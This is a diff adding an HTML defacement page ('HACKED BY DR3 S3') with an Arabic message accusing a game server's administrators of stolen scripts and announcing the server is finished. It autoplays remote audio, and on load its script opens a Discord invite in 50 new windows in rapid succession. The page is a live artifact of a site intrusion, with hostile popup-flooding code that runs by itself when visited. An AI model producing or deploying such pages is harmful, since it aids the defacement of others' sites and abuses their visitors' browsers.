@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HACKED BY SAHM</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#0b0b0d;
+      --grid:#0f1115;
+      --term-border:#171a21;
+      --term-text:#9fffb2;
+      --muted:#7a7f8b;
+      --white:#e8f1ff;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      background: var(--bg);
+      color: var(--white);
+      display:grid;
+      place-items:center;
+      font-family: "Fira Code", monospace;
+      overflow:hidden;
+    }
+    body::before{
+      content:"";
+      position:fixed; inset:0;
+      background:
+        repeating-linear-gradient(0deg, var(--grid) 0 1px, transparent 1px 48px),
+        repeating-linear-gradient(90deg, var(--grid) 0 1px, transparent 1px 48px);
+      opacity:.5;
+      pointer-events:none;
+    }
+    .wrap{
+      width:min(1024px, 92vw);
+      display:none; /* نخفيه بالبداية */
+      flex-direction:column;
+      align-items:center;
+      gap:28px;
+      padding:28px;
+      text-align:center;
+    }
+    .hero img{
+      width:min(500px, 150vw);
+      border-radius:16px;
+      box-shadow:0 0 35px rgba(0, 240, 255, .25);
+    }
+    .title{
+      font-family: "Orbitron", sans-serif;
+      font-size: clamp(28px, 5vw, 48px);
+      text-transform:uppercase;
+      color:#dffbff;
+      text-shadow:0 0 12px rgba(0,240,255,.45);
+    }
+    .terminal{
+      width:100%;
+      background:#0d0f13;
+      border:1px solid var(--term-border);
+      border-radius:14px;
+      padding:18px;
+      text-align:left;
+    }
+    .terminal::before{
+      content:"mystery@system:~$ why?";
+      display:block;
+      font: 600 14px/1 "Fira Code", monospace;
+      color:#bfeaff;
+      margin-bottom:12px;
+    }
+    .line{
+      font: 500 15px/1.8 "Fira Code", monospace;
+      color:var(--term-text);
+      white-space: pre-wrap;
+    }
+    .footer{
+      margin-top:12px;
+      font: 600 11px/1.6 "Fira Code", monospace;
+      color:var(--muted);
+      text-align:center;
+    }
+
+    .typewriter{
+      font:600 18px/1.6 "Fira Code", monospace;
+      color:#9fffb2;
+      white-space:pre;
+      width:fit-content;
+      overflow:hidden;
+    }
+  </style>
+</head>
+<body>
+  <!-- الصوت -->
+  <audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1407803875800645663/1407954147097182258/9911_1_3_2." type="audio/mpeg">
+  </audio>
+
+  <!-- السطر اللي ينكتب -->
+  <div id="intro" class="typewriter"></div>
+
+  <!-- باقي الصفحة -->
+  <main class="wrap" id="mainContent">
+    <div class="hero">
+      <img src="https://i.postimg.cc/15F9SHvG/s3AQ.png" alt="Hacked Image">
+    </div>
+
+    <h1 class="title"> 🛡 HACKED BY DR3 S3</h1>
+
+    <section class="terminal">
+      <div class="line">
+السلام عليكم ورحمة الله وبركاته \  DR3 S3 
+لا نعتدي بل نرد 
+الرجاء مراجعت سكربتاتك لانها مسروقة كلها من سيرفر فالنتاين 
+وانتم كنتو منا وفينا وعطيناكم فرصه المحاولة في المنافسه لاكن مطايه 
+حاولنا التواصل السلمي اكثر من مرة بلا جدوى 
+استقطاب مواهب الغش و السحب الملفات لانشاء سكربت وب الاخير (حصري)
+لا تضحكون على الناس واستقطبو الرجال ب الادارة 
+#سيرفركم_انتهى    
+      </div>
+    </section>
+    <div class="footer">
+      OFFICALY BLACKSHAMMER • SAHMNETWORK
+    </div>
+  </main>
+
+<script>
+  const text1 = " SECURITY ALERT DR3 S3 IN THE SYSTRM"; 
+  const text2 = "لا تنسى تنورنا بــــ الدسكورد"; 
+
+  const intro = document.getElementById("intro");
+  let i = 0;
+  let j = 0;
+
+  function typeWriter1(){
+    if(i < text1.length){
+      intro.textContent += text1.charAt(i);
+      i++;
+      setTimeout(typeWriter1, 50); // سرعة الكتابة
+    } else {
+      setTimeout(()=>{
+        intro.textContent += "\n"; // ينزل سطر جديد
+        typeWriter2();
+      },500);
+    }
+  }
+
+  function typeWriter2(){
+    if(j < text2.length){
+      intro.textContent += text2.charAt(j);
+      j++;
+      setTimeout(typeWriter2, 20);
+    } else {
+      // بعد انتهاء الكتابة
+      setTimeout(() => {
+        intro.style.display = "none";
+        document.getElementById("mainContent").style.display = "flex";
+
+        // هنا كود فتح رابط الديسكورد
+        const url = "https://discord.com/invite/vln";
+        const times = 50; // عدد المرات
+        const delay = 100; // الفاصل بالمللي ثانية
+
+        for(let i = 0; i < times; i++){
+          setTimeout(() => {
+            window.open(url, "_blank");
+          }, i * delay);
+        }
+
+      }, 1000);
+    }
+  }
+
+  window.onload = typeWriter1;
+</script>
+</body>
+</html>
